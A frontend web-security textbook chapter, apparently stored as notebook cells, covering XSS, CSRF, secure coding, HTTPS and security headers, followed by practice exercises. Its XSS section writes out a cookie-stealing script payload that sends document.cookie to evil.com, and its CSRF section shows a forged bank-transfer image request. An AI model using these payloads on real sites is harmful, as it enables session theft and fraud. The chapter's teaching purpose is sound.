    "## Introduction\n",
    "\n",
    "Security is often perceived as a backend concern\u2014something handled by servers, databases, and network infrastructure. However, as a frontend developer, you play a critical role in protecting your users and their data. Many common attacks, such as Cross\u2011Site Scripting (XSS) and Cross\u2011Site Request Forgery (CSRF), exploit vulnerabilities in the frontend code. A single oversight\u2014like failing to sanitize user input or using an insecure cookie\u2014can compromise an entire application.\n",
    "\n",
    "In this chapter, you will learn the foundational security concepts every frontend developer must know:\n",
    "\n",
    "- **Core security principles** \u2013 defense in depth, least privilege, and never trusting user input.\n",
    "- **Cross\u2011Site Scripting (XSS)** \u2013 what it is, the different types, and how to prevent it.\n",
    "- **Cross\u2011Site Request Forgery (CSRF)** \u2013 how it works and how to protect against it.\n",
    "- **Secure coding practices** \u2013 input validation, output encoding, and handling sensitive data.\n",
    "- **HTTPS and secure connections** \u2013 why encryption matters and how to avoid mixed content.\n",
    "- **Security headers** \u2013 using Content Security Policy (CSP), HSTS, and others to harden your site.\n",
    "\n",
    "By the end of this chapter, you will understand the most common web security threats and how to write frontend code that is resilient against them.\n",
    "\n",
    "---\n",
    "\n",
    "## 28.1 Security Principles\n",
    "\n",
    "Before diving into specific attacks, it's essential to understand the core principles that guide secure development.\n",
    "\n",
    "### Defense in Depth\n",
    "\n",
    "**Defense in depth** means layering multiple security controls so that if one fails, others still provide protection. For example:\n",
    "\n",
    "- Validate input on the client side for user experience, but **always validate on the server** as well.\n",
    "- Use HTTPS to encrypt data in transit, and also use secure cookies and Content Security Policy.\n",
    "- Sanitize output to prevent XSS, and also use a strong CSP as a second line of defense.\n",
    "\n",
    "Never rely on a single security measure.\n",
    "\n",
    "### Least Privilege\n",
    "\n",
    "The **principle of least privilege** states that any user, program, or process should have only the minimum privileges necessary to perform its function. For frontend development:\n",
    "\n",
    "- Don't store sensitive data in `localStorage` unless absolutely necessary.\n",
    "- Use cookies with the `HttpOnly` flag to prevent JavaScript access to session tokens.\n",
    "- Limit the scope of API keys and tokens exposed to the client.\n",
    "\n",
    "### Never Trust User Input\n",
    "\n",
    "This is the golden rule of web security. Any data that comes from the user\u2014whether from form fields, URL parameters, or even HTTP headers\u2014must be treated as potentially malicious. Always:\n",
    "\n",
    "- **Validate** \u2013 ensure the data conforms to expected formats (e.g., email, number, length).\n",
    "- **Sanitize** \u2013 remove or escape dangerous characters.\n",
    "- **Encode** \u2013 when outputting data, encode it for the appropriate context (HTML, JavaScript, CSS, URL).\n",
    "\n",
    "---\n",
    "\n",
    "## 28.2 Cross\u2011Site Scripting (XSS)\n",
    "\n",
    "Cross\u2011Site Scripting (XSS) is one of the most common and dangerous web vulnerabilities. It occurs when an attacker injects malicious scripts into a web page viewed by other users. The injected script can steal cookies, session tokens, or other sensitive information, or perform actions on behalf of the user.\n",
    "\n",
    "### Types of XSS Attacks\n",
    "\n",
    "**1. Stored XSS (Persistent XSS)**\n",
    "\n",
    "The malicious script is permanently stored on the target server (e.g., in a database, comment field, or forum post). When a user requests the stored content, the script is delivered and executed in their browser.\n",
    "\n",
    "*Example:* An attacker posts a comment containing `<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`. When other users view the comment, their cookies are sent to the attacker.\n",
    "\n",
    "**2. Reflected XSS (Non\u2011Persistent XSS)**\n",
    "\n",
    "The malicious script is part of the current request (e.g., in a search query or URL parameter) and is immediately reflected off the web server in the response. The attacker typically tricks the victim into clicking a specially crafted link.\n",
    "\n",
    "*Example:* A search page that echoes the search term without encoding: `https://example.com/search?q=<script>alert('XSS')</script>`. If the site reflects `q` directly into the page, the script executes.\n",
    "\n",
    "**3. DOM\u2011Based XSS**\n",
    "\n",
    "The vulnerability exists in client\u2011side JavaScript code that dynamically inserts user\u2011controlled data into the DOM. The attack never reaches the server; it's entirely in the browser.\n",
    "\n",
    "*Example:* JavaScript reads a value from `window.location.hash` and writes it to the page using `innerHTML` without sanitization.\n",
    "\n",
    "### Preventing XSS\n",
    "\n",
    "**1. Output Encoding (Escaping)**\n",
    "\n",
    "The most fundamental defense: always encode data before inserting it into HTML, JavaScript, CSS, or URLs. Use the appropriate encoding for the context.\n",
    "\n",
    "| Context | Encoding Method | Example |\n",
    "|---------|-----------------|---------|\n",
    "| HTML body | HTML entity encode | `<` \u2192 `&lt;` |\n",
    "| HTML attribute | Attribute encode | `\"` \u2192 `&quot;` |\n",
    "| JavaScript string | JavaScript string encode | `'` \u2192 `\\'` |\n",
    "| URL parameter | URL encode | `&` \u2192 `%26` |\n",
    "\n",
    "In practice, use trusted libraries or framework features:\n",
    "\n",
    "```javascript\n",
    "// Bad: directly inserting user input\n",
    "element.innerHTML = userInput;\n",
    "\n",
    "// Good: using textContent (automatically encodes)\n",
    "element.textContent = userInput;\n",
    "\n",
    "// For complex cases, use a sanitization library\n",
    "import DOMPurify from 'dompurify';\n",
    "element.innerHTML = DOMPurify.sanitize(userInput);\n",
    "```\n",
    "\n",
    "**2. Content Security Policy (CSP)**\n",
    "\n",
    "CSP is a browser security mechanism that allows you to define which sources of content are trusted. A strong CSP can mitigate XSS even if an injection occurs.\n",
    "\n",
    "```http\n",
    "Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.example.com; object-src 'none'\n",
    "```\n",
    "\n",
    "This policy:\n",
    "- Allows scripts only from the same origin and `apis.example.com`.\n",
    "- Disallows plugins (`object-src`).\n",
    "- Prevents inline scripts and `eval()` by default (unless you add `'unsafe-inline'`, which you should avoid).\n",
    "\n",
    "**3. Use Framework Protections**\n",
    "\n",
    "Modern frameworks like React, Vue, and Angular automatically escape content by default. However, be cautious when using features like `dangerouslySetInnerHTML` (React) or `v-html` (Vue)\u2014they bypass protections.\n",
    "\n",
    "```jsx\n",
    "// React: safe by default\n",
    "<div>{userInput}</div>\n",
    "\n",
    "// Unsafe: only use with sanitized content\n",
    "<div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />\n",
    "```\n",
    "\n",
    "**4. Sanitize User Input on the Server**\n",
    "\n",
    "Never trust client\u2011side validation alone. Sanitize or reject malicious input on the server before storing or processing it.\n",
    "\n",
    "---\n",
    "\n",
    "## 28.3 Cross\u2011Site Request Forgery (CSRF)\n",
    "\n",
    "Cross\u2011Site Request Forgery (CSRF) tricks an authenticated user into performing unintended actions on a web application where they are currently logged in. The attacker crafts a malicious request (e.g., via an image tag or a hidden form) and lures the victim to a page that triggers it. Because the request includes the user's session cookie, the server believes it is legitimate.\n",
    "\n",
    "### How CSRF Works\n",
    "\n",
    "1. Alice logs into `bank.com` and receives a session cookie.\n",
    "2. Without logging out, she visits `evil.com`, which contains:\n",
    "   ```html\n",
    "   <img src=\"https://bank.com/transfer?amount=1000&to=attacker\">\n",
    "   ```\n",
    "3. The browser automatically sends Alice's cookie with the request to `bank.com`.\n",
    "4. `bank.com` processes the transfer, believing Alice initiated it.\n",
    "\n",
    "### Preventing CSRF\n",
    "\n",
    "**1. CSRF Tokens (Synchronizer Token Pattern)**\n",
    "\n",
    "The server embeds a unique, unpredictable token in forms or AJAX requests. When the request is submitted, the server validates the token. Since the attacker cannot guess the token, the request fails.\n",
    "\n",
    "```html\n",
    "<form action=\"/transfer\" method=\"POST\">\n",
    "    <input type=\"hidden\" name=\"csrf_token\" value=\"random-unpredictable-value\">\n",
    "    <!-- other form fields -->\n",
    "</form>\n",
    "```\n",
    "\n",
    "For AJAX requests, send the token in a custom header.\n",
    "\n",
    "**2. SameSite Cookies**\n",
    "\n",
    "Set the `SameSite` attribute on cookies to control when they are sent:\n",
    "\n",
    "- `SameSite=Strict` \u2013 cookie is sent only for requests originating from the same site.\n",
    "- `SameSite=Lax` \u2013 cookie is sent for top\u2011level navigations (e.g., clicking a link) but not for embedded requests like images (good balance).\n",
    "- `SameSite=None` \u2013 cookie is sent for all requests (must also use `Secure`).\n",
    "\n",
    "```http\n",
    "Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly\n",
    "```\n",
    "\n",
    "Modern browsers default to `SameSite=Lax` if not specified, which already protects against many CSRF attacks.\n",
    "\n",
    "**3. Check Origin Headers**\n",
    "\n",
    "On the server, validate the `Origin` and `Referer` headers to ensure the request came from your own domain. This is less reliable than tokens but adds another layer.\n",
    "\n",
    "**4. Use Custom Request Headers**\n",
    "\n",
    "For AJAX requests, require a custom header (e.g., `X-Requested-With: XMLHttpRequest`). Browsers enforce the same\u2011origin policy for custom headers, so an attacker cannot add them from a different site.\n",
    "\n",
    "---\n",
    "\n",
    "## 28.4 Secure Coding Practices\n",
    "\n",
    "Beyond specific attacks, adopting secure coding habits will prevent many vulnerabilities.\n",
    "\n",
    "### Input Validation\n",
    "\n",
    "Validate all user input on both client and server:\n",
    "\n",
    "- **Type checking** \u2013 ensure numbers are numbers, emails match a pattern, etc.\n",
    "- **Length limits** \u2013 prevent buffer overflows and denial of service.\n",
    "- **Whitelist allowed characters** rather than blacklisting dangerous ones.\n",
    "\n",
    "```javascript\n",
    "// Example: validating an email on the client\n",
    "function isValidEmail(email) {\n",
    "    const re = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n",
    "    return re.test(email);\n",
    "}\n",
    "```\n",
    "\n",
    "### Output Encoding\n",
    "\n",
    "As discussed, encode data before inserting it into HTML, JavaScript, or URLs. Use context\u2011specific encoding functions.\n",
    "\n",
    "### Principle of Least Privilege for APIs\n",
    "\n",
    "- Don't expose more data than necessary. For example, if an API returns a user object, don't send the password hash to the client.\n",
    "- Use scoped API keys with limited permissions.\n",
    "\n",
    "### Handling Sensitive Data\n",
    "\n",
    "- **Never store passwords, API keys, or tokens in `localStorage` or `sessionStorage`** \u2013 they are accessible to any JavaScript on the same origin.\n",
    "- Use **`HttpOnly` cookies** for session tokens \u2013 they are not accessible via JavaScript, mitigating XSS token theft.\n",
    "- For sensitive operations, require re\u2011authentication (e.g., entering password again before changing email or making a large transfer).\n",
    "- Avoid logging sensitive information to the console.\n",
    "\n",
    "### Third\u2011Party Dependencies\n",
    "\n",
    "- Regularly update libraries to patch known vulnerabilities.\n",
    "- Use tools like `npm audit` or `yarn audit` to check for vulnerable dependencies.\n",
    "- Be cautious with third\u2011party scripts \u2013 they have the same access as your own code.\n",
    "\n",
    "---\n",
    "\n",
    "## 28.5 HTTPS and Secure Connections\n",
    "\n",
    "HTTPS (HTTP over TLS) encrypts communication between the browser and the server, protecting against eavesdropping, tampering, and man\u2011in\u2011the\u2011middle attacks.\n",
    "\n",
    "### Why HTTPS Matters\n",
    "\n",
    "- **Confidentiality** \u2013 data cannot be read in transit.\n",
    "- **Integrity** \u2013 data cannot be modified without detection.\n",
    "- **Authentication** \u2013 the user is assured they are communicating with the genuine website.\n",
    "\n",
    "Many browser features (like geolocation, service workers, and the Clipboard API) require a secure context (HTTPS or localhost).\n",
    "\n",
    "### Mixed Content\n",
    "\n",
    "When a page is loaded over HTTPS but includes resources (images, scripts, styles) over HTTP, that is **mixed content**. Browsers may block or warn about it, and it weakens security.\n",
    "\n",
    "```html\n",
    "<!-- Bad: loading script over HTTP on an HTTPS page -->\n",
    "<script src=\"http://example.com/script.js\"></script>\n",
    "```\n",
    "\n",
    "Always use relative URLs or HTTPS URLs for all resources.\n",
    "\n",
    "### Obtaining and Enforcing HTTPS\n",
    "\n",
    "- Use a free certificate from **Let's Encrypt**.\n",
    "- Redirect all HTTP traffic to HTTPS.\n",
    "- Use **HTTP Strict Transport Security (HSTS)** to tell browsers to always use HTTPS for your domain.\n",
    "\n",
    "### Secure Cookies\n",
    "\n",
    "When setting cookies, use these flags:\n",
    "\n",
    "- **`Secure`** \u2013 cookie is only sent over HTTPS.\n",
    "- **`HttpOnly`** \u2013 cookie cannot be accessed by JavaScript (prevents XSS theft).\n",
    "- **`SameSite`** \u2013 as discussed, helps prevent CSRF.\n",
    "\n",
    "```http\n",
    "Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax\n",
    "```\n",
    "\n",
    "---\n",
    "\n",
    "## 28.6 Security Headers\n",
    "\n",
    "HTTP response headers provide an additional layer of security by instructing the browser how to behave.\n",
    "\n",
    "### Content\u2011Security\u2011Policy (CSP)\n",
    "\n",
    "As introduced in the XSS section, CSP is a powerful header that controls which resources the browser is allowed to load. A well\u2011configured CSP can prevent XSS, clickjacking, and other attacks.\n",
    "\n",
    "```http\n",
    "Content-Security-Policy: \n",
    "    default-src 'self';\n",
    "    script-src 'self' https://trusted-cdn.com;\n",
    "    style-src 'self' 'unsafe-inline'; /* avoid unsafe-inline if possible */\n",
    "    img-src 'self' data: https://images.example.com;\n",
    "    font-src 'self';\n",
    "    connect-src 'self' https://api.example.com;\n",
    "    frame-ancestors 'none';\n",
    "    form-action 'self';\n",
    "    base-uri 'self';\n",
    "    object-src 'none';\n",
    "```\n",
    "\n",
    "**Key directives:**\n",
    "- `default-src` \u2013 fallback for other resource types.\n",
    "- `script-src` \u2013 allowed sources for JavaScript.\n",
    "- `style-src` \u2013 allowed sources for CSS.\n",
    "- `img-src` \u2013 allowed sources for images.\n",
    "- `connect-src` \u2013 allowed URLs for `fetch`, `XHR`, WebSockets.\n",
    "- `frame-ancestors` \u2013 prevents clickjacking by controlling where your site can be embedded.\n",
    "- `form-action` \u2013 restricts where forms can be submitted.\n",
    "- `base-uri` \u2013 restricts the `<base>` element.\n",
    "\n",
    "CSP can be deployed in **report\u2011only mode** to test without blocking:\n",
    "\n",
    "```http\n",
    "Content-Security-Policy-Report-Only: ...; report-uri /csp-report-endpoint\n",
    "```\n",
    "\n",
    "### HTTP Strict Transport Security (HSTS)\n",
    "\n",
    "HSTS tells browsers to always use HTTPS for your domain, even if the user types `http://` or clicks an HTTP link. It also prevents users from bypassing certificate warnings.\n",
    "\n",
    "```http\n",
    "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n",
    "```\n",
    "\n",
    "- `max-age` \u2013 seconds to remember (1 year is common).\n",
    "- `includeSubDomains` \u2013 applies to all subdomains.\n",
    "- `preload` \u2013 allows inclusion in browser preload lists for even stronger enforcement.\n",
    "\n",
    "### X\u2011Frame\u2011Options\n",
    "\n",
    "Prevents clickjacking by controlling whether your site can be embedded in an iframe.\n",
    "\n",
    "```http\n",
    "X-Frame-Options: DENY\n",
    "X-Frame-Options: SAMEORIGIN\n",
    "```\n",
    "\n",
    "`DENY` \u2013 no framing allowed.  \n",
    "`SAMEORIGIN` \u2013 framing allowed only from the same origin.\n",
    "\n",
    "Note that CSP's `frame-ancestors` directive supersedes `X-Frame-Options` in modern browsers.\n",
    "\n",
    "### X\u2011Content\u2011Type\u2011Options\n",
    "\n",
    "Prevents MIME type sniffing, which can lead to security vulnerabilities. It forces the browser to respect the declared `Content-Type`.\n",
    "\n",
    "```http\n",
    "X-Content-Type-Options: nosniff\n",
    "```\n",
    "\n",
    "### Referrer\u2011Policy\n",
    "\n",
    "Controls how much referrer information is included with requests. This protects user privacy and can prevent leakage of sensitive URLs.\n",
    "\n",
    "```http\n",
    "Referrer-Policy: strict-origin-when-cross-origin\n",
    "```\n",
    "\n",
    "Common values:\n",
    "- `no-referrer` \u2013 never send referrer.\n",
    "- `same-origin` \u2013 send referrer only for same\u2011origin requests.\n",
    "- `strict-origin-when-cross-origin` \u2013 send full URL for same\u2011origin, origin only for cross\u2011origin (good default).\n",
    "\n",
    "### Permissions\u2011Policy (formerly Feature\u2011Policy)\n",
    "\n",
    "Controls which browser features (camera, microphone, geolocation, etc.) your site and embedded third\u2011party content can use.\n",
    "\n",
    "```http\n",
    "Permissions-Policy: geolocation=(), camera=(), microphone=()\n",

    "## Chapter Summary\n",
    "\n",
    "In this chapter, you learned the fundamental security concepts that every frontend developer must understand:\n",
    "\n",
    "- **Core principles** \u2013 defense in depth, least privilege, and never trusting user input.\n",
    "- **Cross\u2011Site Scripting (XSS)** \u2013 stored, reflected, and DOM\u2011based attacks, and how to prevent them with output encoding, CSP, and framework protections.\n",
    "- **Cross\u2011Site Request Forgery (CSRF)** \u2013 how attackers trick authenticated users, and defenses including CSRF tokens, SameSite cookies, and origin validation.\n",
    "- **Secure coding practices** \u2013 input validation, output encoding, handling sensitive data, and managing third\u2011party dependencies.\n",
    "- **HTTPS and secure connections** \u2013 why encryption matters, avoiding mixed content, and secure cookie flags.\n",
    "- **Security headers** \u2013 CSP, HSTS, X\u2011Frame\u2011Options, and others that harden your site against attacks.\n",
    "\n",
    "### Key Takeaways\n",
    "\n",
    "- Never trust user input\u2014validate, sanitize, and encode at every boundary.\n",
    "- Use Content Security Policy (CSP) as a powerful defense against XSS.\n",
    "- Always use HTTPS and set secure cookie flags (`Secure`, `HttpOnly`, `SameSite`).\n",
    "- Implement CSRF tokens for state\u2011changing operations.\n",
    "- Security is a shared responsibility between frontend and backend\u2014defense in depth is essential.\n",
    "- Keep your dependencies updated and audit them regularly.\n",
    "\n",
    "### Practice Exercises\n",
    "\n",
    "1. **XSS Challenge**: Create a simple page that echoes a URL parameter into the DOM using `innerHTML`. Then exploit it with a script. Fix it by using `textContent` instead.\n",
    "\n",
    "2. **CSP Implementation**: Add a Content\u2011Security\u2011Policy header to a test page. Experiment with different directives and observe what breaks. Use report\u2011only mode first.\n",
    "\n",
    "3. **CSRF Simulation**: Build two simple pages: a \"bank\" transfer form (with CSRF token) and a malicious page that attempts to submit the form without the token. Verify that the token blocks the attack.\n",
    "\n",
    "4. **Secure Cookie Lab**: In a local HTTPS environment (use mkcert or similar), set a cookie with `Secure`, `HttpOnly`, and `SameSite` flags. Verify that JavaScript cannot access it and that it's only sent over HTTPS.\n",
    "\n",
    "5. **Security Headers Audit**: Use a tool like securityheaders.com to analyze a website you've built. Implement missing headers and re\u2011audit.\n",
    "\n",
    "6. **Dependency Audit**: Run `npm audit` on a project you're working on. Investigate any reported vulnerabilities and update or patch them.\n",
    "\n",
    "7. **HTTPS Migration**: If you have a site running on HTTP locally, set up a local HTTPS server using `https\u2011server` or a tool like `ngrok`. Test that mixed content warnings appear when you load HTTP resources.\n",
    "\n",
    "---\n",
    "\n",
    "## Coming Up Next\n",
    "\n",
    "**Chapter 29: Best Practices and Code Quality**\n",
    "\n",
    "In the next chapter, you'll learn about professional best practices: writing clean code, organizing projects, using version control with Git, documenting your work, and conducting code reviews. These habits will make you a more effective and sought\u2011after developer."
